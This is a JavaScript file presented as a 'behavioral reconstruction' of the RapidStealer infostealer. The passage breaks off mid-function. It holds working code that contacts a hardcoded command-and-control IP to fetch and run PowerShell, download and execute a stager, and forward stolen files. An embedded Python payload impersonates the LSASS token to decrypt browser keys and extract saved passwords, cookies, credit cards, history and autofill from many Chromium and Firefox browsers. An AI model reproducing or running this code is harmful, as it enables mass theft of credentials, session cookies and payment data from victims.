// ======================================================================
// RapidStealer — Behavioral Reconstruction
// ======================================================================

'use strict';
const fs = require('fs');
const path = require('path');
const os = require('os');
const crypto = require('crypto');
const http = require('http');
const https = require('https');
const axios = require('axios');
const FormData = require('form-data');
const AdmZip = require('adm-zip');
const archiver = require('archiver');
const sqlite3 = require('sqlite3').verbose();
const cp = require('child_process');
const { promisify } = require('util');
const nodeStreamZip = require('node-stream-zip');

// ======================================================================
// CONFIGURATION
// ======================================================================
const C2_HOST = '46.151.182.157';
const C2_PORTS = { webhook: 1337, forwarder: 2008, ps: 1337, download: 751 };
const BUILD_KEY = 'RAPD-D354-GHLG-E5D6-I7XZ-2026';
const KEY_EXPIRY = new Date('2026-06-09T20:27:26.054Z');
const STEAM_API_KEY = '440D7F4D810EF9298D25EDDF37C1F902';
const BRAND = '@Rapidstealer';
const TELEGRAM = 't.me/rapidstealerxx';

const IMG = {
  avatar: 'https://cdn.discordapp.com/attachments/1267444884495798283/1436475079927009362/cover_1.png?ex=690fbd2b&is=690e6bab&hm=8b7f7b7c597dcf11791ecf46479c99656c625760d6953dff5c3ac92ea6865a73&',
  icon: 'https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&',
  thumb1: 'https://i.pinimg.com/736x/7e/61/24/7e6124f9cc9ebaca4cdcf8870bb3df7d5.jpg',
  thumb2: 'https://i.pinimg.com/736x/33/ee/f5/33eef535b2ffa74da6a14c01834f2932.jpg',
};

// Discord custom emoji IDs used across all embeds
const EMOJI = {
  chrome: '<:GoogleChrome:1490265007005630466>',
  firefox: '<:Firefox:1490265238413643877>',
  edge: '<:MicrosoftEdge:1490265051301675138>',
  brave: '<:Brave:1490264964085186681>',
  opera: '<:Opera:1490265101809352795>',
  opera_gx: '<:OperaGX:1490265335440609380>',
  crystals: '<:35492crystals:1425428123058569236>',
  arrow: '<:Arrow:1490352510223777883>',
  gothrose: '<:30111gothrose:1425428186694549625>',
  chromeheart: '<:13129chromeheart:1425428161889571010>',
  bubble: '<:19381bubble:1425428173646204928>',
  star: '<:85495star:1425428149679685745>',
  duostar: '<:66181duostar:1425428137516204195>',
  prettymoon: '<:26411prettymoon:1425428180814270556>',
  success: '<:32040successfulverificationids:1426857164877729823>',
  blocked: '<:81496blockedids:1426857163640275104>',
};

// ======================================================================
// 0. ANTI-DEBUG RE-LAUNCH
// ======================================================================

function antiDebugReLaunch() {
  const requiredFlags = [
    '--disable-gpu', '--no-sandbox', '--disable-logging',
    '--disable-logging-redirect', '--log-level=3',
    '--disable-crash-reporter', '--disable-breakpad',
    '--disable-component-update',
    '--disable-features=TranslateUI',
    '--disable-ipc-flooding-protection',
    '--disable-hang-monitor', '--no-error-dialogs',
  ];
  const args = process.argv.slice(1);
  const hasAll = requiredFlags.every(f => args.includes(f));
  if (!hasAll) {
    const allArgs = [...args, ...requiredFlags];
    const child = cp.spawn(process.execPath, allArgs, {
      detached: true, stdio: 'ignore', windowsHide: true,
    });
    child.unref();
    process.exit(0);
  }
}

// ======================================================================
// 1. EXPIRY CHECK
// ======================================================================
function isKeyExpired() { return new Date() > KEY_EXPIRY; }

// ======================================================================
// 2. TLS VALIDATION DISABLE + KEYWORD TARGETS
// ======================================================================

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const TARGET_KEYWORDS = [
  'binance', 'coinbase', 'exodus', 'ubear', 'gmail', 'minecraft',
  'steam', 'epicgames', 'discord', 'paypal', 'paysafecard', 'g2a',
  'youtube', 'instagram', 'twitter', 'spotify', 'pornhub', 'tiktok',
  'origin', 'amazon', 'ebay', 'proton', 'uber', 'aliexpress', 'yahoo',
  'microsoft', 'outlook', 'netflix', 'hbo', 'opensea', 'roblox',
  'expressvpn', 'twitch', 'facebook', 'valorant', 'riotgames', 'xbox',
  'stake', 'aol', 'card', 'crypto', 'buy', 'sell',
];

// ======================================================================
// 3. C2 COMMUNICATION
// ======================================================================

async function fetchWebhookURL(buildKey) {
  try {
    const res = await axios.get(`http://${C2_HOST}:${C2_PORTS.webhook}/webhook`, { params: { key: buildKey } });
    return res.data;
  } catch (e) { return null; }
}

async function forwardEmbed(payload) {
  try {
    await axios.post(`http://${C2_HOST}:${C2_PORTS.forwarder}/api/forwarder`, payload,
      { headers: { 'Content-Type': 'application/json' } });
  } catch (e) {}
}

async function forwardFormData(payloadJson, filePath, fileName) {
  try {
    const form = new FormData();
    form.append('payload_json', JSON.stringify(payloadJson));
    form.append('file', fs.createReadStream(filePath), fileName);
    await axios.post(`http://${C2_HOST}:${C2_PORTS.forwarder}/api/forwarder`, form,
      { headers: form.getHeaders() });
  } catch (e) {}
}

// ======================================================================
// 4. C2 POWERSHELL COMMAND EXECUTION (Ajuz8Jj)
// ======================================================================

async function executeC2PowerShell() {
  try {
    const url = `http://${C2_HOST}:${C2_PORTS.ps}/api/ps`;
    const response = await axios.get(url);
    const commands = response.data;
    if (!commands) return;

    const child = cp.spawn('powershell.exe', [
      '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', '-',
    ]);
    child.stdin.write(commands);
    child.stdin.end();
    child.on('exit', (code) => console.log('(Exit Code: ' + code + ')'));
    child.stderr.on('data', (data) => console.error('Error: ' + data));
  } catch (e) {
    console.error('C2 PS exec error:', e.message);
  }
}

// ======================================================================
// 5. C2 PANEL COMMUNICATION (PtEhn8L)
// ======================================================================

async function communicateWithPanel() {
  try {
    await Z2zMSFd();  // download screenviewer
    await VpKIBW();   // execute screenviewer
  } catch (e) {
    console.error('[PANEL] Failed:', e.message);
  }
}

// ======================================================================
// 6. BROWSER PROCESS KILLER
// ======================================================================

async function killBrowserProcess(browserName) {
  return new Promise((resolve) => {
    try {
      cp.execFile('taskkill', ['/F', '/IM', browserName + '.exe'], () => resolve());
    } catch (e) { resolve(); }
  });
}

async function killAllBrowserProcesses() {
  const browsers = ['chrome', 'msedge', 'brave', 'firefox', 'opera', 'vivaldi', 'yandex'];
  for (const name of browsers) {
    await killBrowserProcess(name);
  }
}

// ======================================================================
// 7. DOWNLOAD / SCREENVIEWER HELPERS
// ======================================================================

const STAGER_URL = `http://${C2_HOST}:${C2_PORTS.download}/download`;
const STAGER_FILENAME = 'MainSource_' + crypto.randomBytes(8).toString('hex') + '.exe';
const STAGER_PATH = path.join(os.tmpdir(), STAGER_FILENAME);

async function Z2zMSFd() {
  // Download Screenviewer from C2
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(STAGER_PATH);
    https.get(STAGER_URL, (response) => {
      response.pipe(file);
      file.on('finish', () => { file.close(); resolve(); });
    }).on('error', reject);
  });
}

async function VpKIBW() {
  // Execute the downloaded stager
  try {
    cp.execSync(STAGER_PATH, { stdio: 'ignore', timeout: 30000 });
  } catch (e) {}
  try { fs.unlinkSync(STAGER_PATH); } catch (e) {}
}

// ======================================================================
// 8. EMBEDDED PYTHON BROWSER FORENSICS PAYLOAD
// ======================================================================

const PYTHON_PAYLOAD = `
import os
import io
import json
import struct
import ctypes
import shutil
import windows
import sqlite3
import pathlib
import binascii
import subprocess
import windows.crypto
import windows.security
import windows.generated_def as gdef
from contextlib import contextmanager
from Crypto.Cipher import AES, ChaCha20_Poly1305
import logging
import sys
import base64
from datetime import datetime, timedelta

# Minimal logging for speed
logging.basicConfig(level=logging.CRITICAL, handlers=[])
logger = logging.getLogger(__name__)
logger.disabled = True
identifier = "##BUILD_KEY##"
OUTPUT_BASE_DIR = pathlib.Path(os.environ['TEMP']) / identifier / 'Browser-Datas'
BROWSERS = {
    'chrome': {
        'name': 'Google Chrome',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Google\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\Google\\Chrome\\User Data\\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chromekey1'
    },
    'brave': {
        'name': 'Brave',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data',
        'local_state': r'AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State',
        'process_name': 'brave.exe',
        'key_name': 'Brave Softwarekey1'
    },
    'edge': {
        'name': 'Microsoft Edge',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Microsoft\\Edge\\User Data',
        'local_state': r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State',
        'process_name': 'msedge.exe',
        'key_name': 'Microsoft Edgekey1'
    },
    'opera': {
        'name': 'Opera',
        'type': 'chromium',
        'data_path': r'AppData\\Roaming\\Opera Software\\Opera Stable',
        'local_state': r'AppData\\Roaming\\Opera Software\\Opera Stable\\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'opera_gx': {
        'name': 'Opera GX',
        'type': 'chromium',
        'data_path': r'AppData\\Roaming\\Opera Software\\Opera GX Stable',
        'local_state': r'AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State',
        'process_name': 'opera.exe',
        'key_name': 'Opera Softwarekey1'
    },
    'firefox': {
        'name': 'Firefox',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'chrome_beta': {
        'name': 'Google Chrome Beta',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Google\\Chrome Beta\\User Data',
        'local_state': r'AppData\\Local\\Google\\Chrome Beta\\User Data\\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Google Chrome Betakey1'
    },
    'chromium': {
        'name': 'Chromium',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Chromium\\User Data',
        'local_state': r'AppData\\Local\\Chromium\\User Data\\Local State',
        'process_name': 'chrome.exe',
        'key_name': 'Chromiumkey1'
    },
    'vivaldi': {
        'name': 'Vivaldi',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Vivaldi\\User Data',
        'local_state': r'AppData\\Local\\Vivaldi\\User Data\\Local State',
        'process_name': 'vivaldi.exe',
        'key_name': 'Vivaldikey1'
    },
    'yandex': {
        'name': 'Yandex Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Yandex\\YandexBrowser\\User Data',
        'local_state': r'AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State',
        'process_name': 'browser.exe',
        'key_name': 'Yandex Browserkey1'
    },
    'coccoc': {
        'name': 'CocCoc Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\CocCoc\\Browser\\User Data',
        'local_state': r'AppData\\Local\\CocCoc\\Browser\\User Data\\Local State',
        'process_name': 'browser.exe',
        'key_name': 'CocCoc Browserkey1'
    },
    'qq': {
        'name': 'QQ Browser',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\Tencent\\QQBrowser\\User Data',
        'local_state': r'AppData\\Local\\Tencent\\QQBrowser\\User Data\\Local State',
        'process_name': 'QQBrowser.exe',
        'key_name': 'QQ Browserkey1'
    },
    '360speed': {
        'name': '360 Speed',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\360Chrome\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Speedkey1'
    },
    '360secure': {
        'name': '360 Secure',
        'type': 'chromium',
        'data_path': r'AppData\\Local\\360Chrome\\Chrome\\User Data',
        'local_state': r'AppData\\Local\\360Chrome\\Chrome\\User Data\\Local State',
        'process_name': '360chrome.exe',
        'key_name': '360 Securekey1'
    },
    'firefox_beta': {
        'name': 'Firefox Beta',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_dev': {
        'name': 'Firefox Developer',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_esr': {
        'name': 'Firefox ESR',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    },
    'firefox_nightly': {
        'name': 'Firefox Nightly',
        'type': 'gecko',
        'data_path': r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
        'process_name': 'firefox.exe'
    }
}

class SECItem(ctypes.Structure):
    _fields_ = [('type', ctypes.c_uint),
                ('data', ctypes.c_void_p),
                ('len', ctypes.c_uint)]

class NSSHandler:
    def __init__(self):
        self.nss = None
        self.loaded = False
        self._load_library()

    def _load_library(self):
        paths = [
            r"C:\\Program Files\\Mozilla Firefox\\nss3.dll",
            r"C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll"
        ]
        for path in paths:
            if os.path.exists(path):
                try:
                    try:
                        os.add_dll_directory(os.path.dirname(path))
                    except AttributeError:
                        os.environ['PATH'] = os.path.dirname(path) + ';' + os.environ['PATH']
                    self.nss = ctypes.CDLL(path)
                    self.nss.NSS_Init.argtypes = [ctypes.c_char_p]
                    self.nss.NSS_Init.restype = ctypes.c_int
                    self.nss.NSS_Shutdown.argtypes = []
                    self.nss.NSS_Shutdown.restype = ctypes.c_int
                    self.nss.PK11SDR_Decrypt.argtypes = [ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p]
                    self.nss.PK11SDR_Decrypt.restype = ctypes.c_int
                    self.loaded = True
                    return
                except Exception as e:
                    logger.error(f"Failed to load NSS from {path}: {e}")

    def init_profile(self, profile_path):
        if not self.loaded: return False
        try:
            if not (pathlib.Path(profile_path) / "cert9.db").exists() and not (pathlib.Path(profile_path) / "cert8.db").exists():
                return False
            ret = self.nss.NSS_Init(str(profile_path).encode('utf-8'))
            return ret == 0
        except Exception as e:
            logger.error(f"Error in NSS_Init: {e}")
            return False

    def shutdown(self):
        if self.loaded:
            try: self.nss.NSS_Shutdown()
            except: pass

    def decrypt(self, encrypted_b64):
        if not self.loaded: return None
        try:
            encrypted_data = base64.b64decode(encrypted_b64)
            input_item = SECItem(0, ctypes.cast(ctypes.create_string_buffer(encrypted_data), ctypes.c_void_p), len(encrypted_data))
            output_item = SECItem(0, None, 0)
            ret = self.nss.PK11SDR_Decrypt(ctypes.byref(input_item), ctypes.byref(output_item), None)
            if ret == 0:
                decrypted_data = ctypes.string_at(output_item.data, output_item.len)
                return decrypted_data.decode('utf-8')
            return None
        except Exception as e:
            logger.error(f"Error decrypting with NSS: {e}")
            return None

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: return False

@contextmanager
def impersonate_lsass():
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation)
        windows.current_thread.token = impersonation_token
        yield
    except Exception as e:
        logger.error(f"Failed to impersonate LSASS: {e}")
        raise
    finally:
        windows.current_thread.token = original_token

def parse_key_blob(blob_data):
    buffer = io.BytesIO(blob_data)
    parsed = {}
    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]
    parsed['flag'] = buffer.read(1)[0]
    if parsed['flag'] in (1, 2):
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
        parsed['encrypted_key'] = parsed['ciphertext']
    return parsed

def decrypt_with_cng(input_data, key_name):
    with impersonate_lsass():
        try:
            from windows.security.cryptography import ProtectionDescriptor
            from windows.crypto import cryptprotect
            return cryptprotect.CryptUnprotectData(input_data)
        except: pass
    return None

def byte_xor(ba1, ba2):
    return bytes([a ^ b for a, b in zip(ba1, ba2)])

def derive_v20_master_key(parsed_data, key_name):
    # Decrypt using DPAPI + AES-GCM (Chromium v20 key format)
    # This is the standard Chrome key derivation algorithm
    encrypted_key = parsed_data.get('encrypted_key', b'')
    if not encrypted_key:
        logger.error("Missing encrypted_key in parsed blob")
        return None
    # Decrypt the key using DPAPI via built-in Windows API
    decrypted_key_data = decrypt_with_cng(encrypted_key, key_name)
    if decrypted_key_data is None:
        return None
    # The decrypted data is the AES-GCM master key
    return decrypted_key_data

def decrypt_v20_value(encrypted_value, master_key):
    if not encrypted_value or not master_key:
        return None
    try:
        version = encrypted_value[:3]
        if version not in (b'v10', b'v11'):
            return None
        nonce = encrypted_value[3:15]
        ciphertext = encrypted_value[15:-16]
        tag = encrypted_value[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        ciphertext = cipher.decrypt_and_verify(ciphertext, tag)
        return ciphertext.decode('utf-8', errors='replace')
    except Exception as e:
        return None

def decrypt_v20_password(encrypted_password, master_key):
    return decrypt_v20_value(encrypted_password, master_key)

def fetch_sqlite_copy(db_path):
    try:
        tmp_path = pathlib.Path(os.environ['TEMP']) / pathlib.Path(db_path).name
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except: return None

def get_chrome_datetime(timestamp):
    try:
        if not timestamp: return "Unknown"
        return datetime(1601, 1, 1) + timedelta(microseconds=timestamp)
    except: return "Unknown"

def extract_bookmarks(profile_path):
    bookmarks_file = profile_path / "Bookmarks"
    if not bookmarks_file.exists(): return []
    try:
        with open(bookmarks_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        bookmarks = []
        def process_node(node):
            if node.get('type') == 'url':
                bookmarks.append({
                    'name': node.get('name', ''),
                    'url': node.get('url', ''),
                    'date_added': get_chrome_datetime(node.get('date_added', 0))
                })
            if 'children' in node:
                for child in node['children']:
                    process_node(child)
        process_node(data.get('roots', {}))
        return bookmarks
    except: return []

def extract_history(profile_path):
    history_db = profile_path / "History"
    if not history_db.exists(): return []
    tmp = fetch_sqlite_copy(history_db)
    if not tmp: return []
    histories = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
        for url, title, count, visit_time in cur.fetchall():
            histories.append({
                'url': url, 'title': title, 'count': count,
                'last_visit': get_chrome_datetime(visit_time)
            })
        con.close()
    except: pass
    finally:
        try: tmp.unlink(); except: pass
    return histories

def extract_credit_cards(profile_path, master_key):
    webdata_db = profile_path / "Web Data"
    if not webdata_db.exists(): return []
    tmp = fetch_sqlite_copy(webdata_db)
    if not tmp: return []
    cards = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT * FROM credit_cards")
        for row in cur.fetchall():
            card = {}
            for i, desc in enumerate(cur.description):
                card[desc[0]] = row[i]
            cards.append(card)
        con.close()
    except: pass
    finally:
        try: tmp.unlink(); except: pass
    return cards

def get_master_key(browser_config):
    user_profile = os.environ['USERPROFILE']
    local_state_path = pathlib.Path(user_profile) / browser_config['local_state']
    if not local_state_path.exists():
        logger.error(f"Local state not found: {local_state_path}")
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        if "os_crypt" in local_state and "app_bound_encrypted_key" in local_state["os_crypt"]:
            key_blob_encrypted = binascii.a2b_base64(local_state["os_crypt"]["app_bound_encrypted_key"])[4:]
            with impersonate_lsass():
                parsed = parse_key_blob(key_blob_encrypted)
                return derive_v20_master_key(parsed, browser_config['key_name'])
        elif "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
            encrypted_key = binascii.a2b_base64(local_state["os_crypt"]["encrypted_key"])
            if encrypted_key[:5] == b'DPAPI':
                encrypted_key = encrypted_key[5:]
            with impersonate_lsass():
                return decrypt_with_cng(encrypted_key, browser_config.get('key_name', ''))
        else:
            logger.error("No os_crypt data found")
            return None
    except Exception as e:
        logger.error(f"Error getting master key: {e}")
        return None

def process_chromium_browser(browser_name, browser_config):
    user_profile = os.environ['USERPROFILE']
    data_path = pathlib.Path(user_profile) / browser_config['data_path']
    if not data_path.exists():
        logger.debug(f"Data path not found: {data_path}")
        return
    master_key = get_master_key(browser_config)
    if master_key is None:
        logger.error(f"Could not get master key for {browser_name}, skipping decryption")
    output_dir = OUTPUT_BASE_DIR / browser_name
    output_dir.mkdir(parents=True, exist_ok=True)
    profile_dirs = [d for d in data_path.iterdir()
                    if d.is_dir() and (d.name == 'Default' or d.name.startswith('Profile '))]
    if not profile_dirs:
        profile_dirs = [data_path / 'Default']
    logger.debug(f"Processing {len(profile_dirs)} profiles for {browser_name}")
    for profile_dir in profile_dirs:
        logger.debug(f"Processing profile: {profile_dir.name}")
        # Login Data (passwords)
        if (profile_dir / "Login Data").exists():
            try:
                tmp = fetch_sqlite_copy(profile_dir / "Login Data")
                if tmp:
                    con = sqlite3.connect(tmp)
                    cur = con.cursor()
                    cur.execute("SELECT origin_url, username_value, action_url, signon_realm, password_value, date_created, times_used FROM logins WHERE blacklisted_by_user = 0")
                    logins = []
                    for row in cur.fetchall():
                        pw = decrypt_v20_password(row[4], master_key) if master_key else None
                        logins.append({
                            'url': row[0], 'username': row[1],
                            'password': pw if pw else '[encrypted]',
                            'realm': row[3], 'used': row[6]
                        })
                    con.close()
                    with open(output_dir / f"{profile_dir.name}_passwords.json", 'w') as f:
                        json.dump(logins, f, indent=2)
                    logger.debug(f"Extracted {len(logins)} passwords from {profile_dir.name}")
                    try: tmp.unlink()
                    except: pass
            except Exception as e:
                logger.error(f"Error extracting passwords: {e}")
        # Cookies
        if (profile_dir / "Network" / "Cookies").exists() or (profile_dir / "Cookies").exists():
            cookie_path = profile_dir / "Network" / "Cookies" if (profile_dir / "Network" / "Cookies").exists() else profile_dir / "Cookies"
            try:
                tmp = fetch_sqlite_copy(cookie_path)
                if tmp:
                    con = sqlite3.connect(tmp)
                    cur = con.cursor()
                    cur.execute("SELECT host_key, name, path, expires_utc, is_secure, is_httponly, has_expires, is_persistent, CAST(encrypted_value AS BLOB) as enc_value FROM cookies")
                    cookies = []
                    for row in cur.fetchall():
                        val = decrypt_v20_value(row[8], master_key) if master_key else None
                        cookies.append({
                            'host': row[0], 'name': row[1], 'value': val if val else '[encrypted]',
                            'path': row[2], 'expires': row[3], 'secure': bool(row[4]),
                            'httponly': bool(row[5])
                        })
                    con.close()
                    with open(output_dir / f"{profile_dir.name}_cookies.json", 'w') as f:
                        json.dump(cookies, f, indent=2)
                    logger.debug(f"Extracted {len(cookies)} cookies from {profile_dir.name}")
                    try: tmp.unlink(); except: pass
            except Exception as e:
                logger.error(f"Error extracting cookies: {e}")
        # Credit Cards
        if (profile_dir / "Web Data").exists():
            cards = extract_credit_cards(profile_dir, master_key)
            if cards:
                with open(output_dir / f"{profile_dir.name}_cards.json", 'w') as f:
                    json.dump(cards, f, indent=2)
        # Bookmarks
        bookmarks = extract_bookmarks(profile_dir)
        if bookmarks:
            with open(output_dir / f"{profile_dir.name}_bookmarks.json", 'w') as f:
                json.dump(bookmarks, f, indent=2)
        # History
        history = extract_history(profile_dir)
        if history:
            with open(output_dir / f"{profile_dir.name}_history.json", 'w') as f:
                json.dump(history, f, indent=2)

def extract_gecko_history(profile_path):
    history_db = profile_path / "places.sqlite"
    if not history_db.exists(): return []
    tmp = fetch_sqlite_copy(history_db)
    if not tmp: return []
    histories = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 500")
        for url, title, count, visit_time in cur.fetchall():
            dt = get_chrome_datetime(visit_time) if visit_time else "Unknown"
            histories.append({'url': url, 'title': title, 'count': count, 'last_visit': dt})
        con.close()
    except: pass
    finally:
        try: tmp.unlink(); except: pass
    return histories

def extract_gecko_bookmarks(profile_path):
    db_path = profile_path / "places.sqlite"
    if not db_path.exists(): return []
    tmp = fetch_sqlite_copy(db_path)
    if not tmp: return []
    bookmarks = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT b.title, p.url, b.dateAdded FROM moz_bookmarks b JOIN moz_places p ON b.fk = p.id WHERE b.type = 1")
        for title, url, date in cur.fetchall():
            bookmarks.append({'title': title, 'url': url, 'date': get_chrome_datetime(date)})
        con.close()
    except: pass
    finally:
        try: tmp.unlink(); except: pass
    return bookmarks

def extract_gecko_autofill(profile_path):
    db_path = profile_path / "formhistory.sqlite"
    if not db_path.exists(): return []
    tmp = fetch_sqlite_copy(db_path)
    if not tmp: return []
    autofills = []
    try:
        con = sqlite3.connect(tmp)
        cur = con.cursor()
        cur.execute("SELECT fieldname, value, timesUsed, firstUsed, lastUsed FROM moz_formhistory ORDER BY lastUsed DESC")
        for fieldname, value, used, first, last in cur.fetchall():
            autofills.append({'field': fieldname, 'value': value, 'used': used})
        con.close()
    except: pass
    finally:
        try: tmp.unlink(); except: pass
    return autofills

def process_gecko_browser(browser_name, browser_config):
    user_profile = os.environ['USERPROFILE']
    profiles_path = pathlib.Path(user_profile) / browser_config['data_path']
    if not profiles_path.exists(): return
    output_dir = OUTPUT_BASE_DIR / browser_name
    output_dir.mkdir(parents=True, exist_ok=True)
    nss_handler = NSSHandler()
    profile_dirs = [d for d in profiles_path.iterdir()
                    if d.is_dir() and (d.name.endswith('.default') or d.name.endswith('.default-release') or d.name.endswith('.default-esr'))]
    for profile_dir in profile_dirs:
        logger.debug(f"Processing Firefox profile: {profile_dir.name}")
        nss_handler.init_profile(str(profile_dir))
        # Signons (passwords)
        logins_file = profile_dir / "logins.json"
        if logins_file.exists():
            try:
                with open(logins_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                logins = []
                for login in data.get('logins', []):
                    username = nss_handler.decrypt(login['encryptedUsername']) if nss_handler.loaded else None
                    password = nss_handler.decrypt(login['encryptedPassword']) if nss_handler.loaded else None
                    logins.append({
                        'hostname': login['hostname'],
                        'username': username if username else '[encrypted]',
                        'password': password if password else '[encrypted]',
                        'formSubmitURL': login.get('formSubmitURL', ''),
                        'httpRealm': login.get('httpRealm', ''),
                    })
                with open(output_dir / f"{profile_dir.name}_logins.json", 'w') as f:
                    json.dump(logins, f, indent=2)
            except Exception as e:
                logger.error(f"Error extracting logins: {e}")
        # Cookies
        cookies_db = profile_dir / "cookies.sqlite"
        if cookies_db.exists():
            try:
                tmp = fetch_sqlite_copy(cookies_db)
                if tmp:
                    con = sqlite3.connect(tmp)
                    cur = con.cursor()
                    cur.execute("SELECT host, name, path, expiry, isSecure, isHttpOnly, value FROM moz_cookies")
                    cookies = [{'host': r[0], 'name': r[1], 'path': r[2], 'expires': r[3],
                                'secure': bool(r[4]), 'httponly': bool(r[5]), 'value': r[6]} for r in cur.fetchall()]
                    con.close()
                    with open(output_dir / f"{profile_dir.name}_cookies.json", 'w') as f:
                        json.dump(cookies, f, indent=2)
                    try: tmp.unlink(); except: pass
            except Exception as e:
                logger.error(f"Error extracting cookies: {e}")
        # History
        history = extract_gecko_history(profile_dir)
        if history:
            with open(output_dir / f"{profile_dir.name}_history.json", 'w') as f:
                json.dump(history, f, indent=2)
        # Bookmarks
        bookmarks = extract_gecko_bookmarks(profile_dir)
        if bookmarks:
            with open(output_dir / f"{profile_dir.name}_bookmarks.json", 'w') as f:
                json.dump(bookmarks, f, indent=2)
        # Autofill
        autofill = extract_gecko_autofill(profile_dir)
        if autofill:
            with open(output_dir / f"{profile_dir.name}_autofill.json", 'w') as f:
                json.dump(autofill, f, indent=2)
        nss_handler.shutdown()

def main():
    logger.info("Starting browser forensics script")
    OUTPUT_BASE_DIR.mkdir(parents=True, exist_ok=True)
    for browser_name, browser_config in BROWSERS.items():
        try:
            subprocess.run(["taskkill", "/F", "/IM", browser_config['process_name']],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            logger.error(f"Error killing process: {e}")
    processed_paths = set()
    user_profile = os.environ['USERPROFILE']
    for browser_name, browser_config in BROWSERS.items():
        try:
            data_path_rel = browser_config.get('data_path', '')
            data_path = pathlib.Path(user_profile) / data_path_rel if data_path_rel else None
            norm = str(data_path).lower() if data_path else ''
            if data_path and data_path.exists():
                if norm in processed_paths:
                    continue
                processed_paths.add(norm)
                if browser_config['type'] == 'chromium':
                    process_chromium_browser(browser_name, browser_config)
                elif browser_config['type'] == 'gecko':
                    process_gecko_browser(browser_name, browser_config)
        except Exception as e:
            logger.error(f"Error processing {browser_name}: {e}")
    logger.info("Script execution completed")

if __name__ == "__main__":
    if not is_admin():
        logger.warning("Script run without admin privileges. Some features might fail.")
    try:
        main()
    except Exception as e:
        logger.critical(f"Unhandled exception in main: {e}")
    finally:
        print("EXECUTION COMPLETE")
`;

// ======================================================================
// 9. PYTHON PAYLOAD DROP & EXECUTE (bZtmq5 / yARZIz)
// ======================================================================

async function dropAndExecutePython() {
  const nupkgUrl = `http://${C2_HOST}:${C2_PORTS.download}/download`;
  const destDir = path.join(os.tmpdir(), '.python_runtime');
  const nupkgPath = path.join(destDir, 'python310.nupkg');
  const scriptPath = path.join(destDir, 'payload.py');

  try {
    if (!fs.existsSync(destDir)) {
      fs.mkdirSync(destDir, { recursive: true });
    }

    // Download Python runtime if not already extracted
    if (!fs.existsSync(nupkgPath) && !fs.existsSync(path.join(destDir, 'tools', 'python.exe'))) {
      const response = await axios({ method: 'get', url: nupkgUrl, responseType: 'stream' });
      const writer = fs.createWriteStream(nupkgPath);
      response.data.pipe(writer);
      await new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
      });
    }

    // Extract nupkg (ZIP format)
    if (!fs.existsSync(path.join(destDir, 'tools'))) {
      const zip = new AdmZip(nupkgPath);
      zip.extractAllTo(destDir);
    }

    // Write the Python payload script
    // Substitute the build key into the Python template
    const scriptSource = PYTHON_PAYLOAD.replace('##BUILD_KEY##', BUILD_KEY);
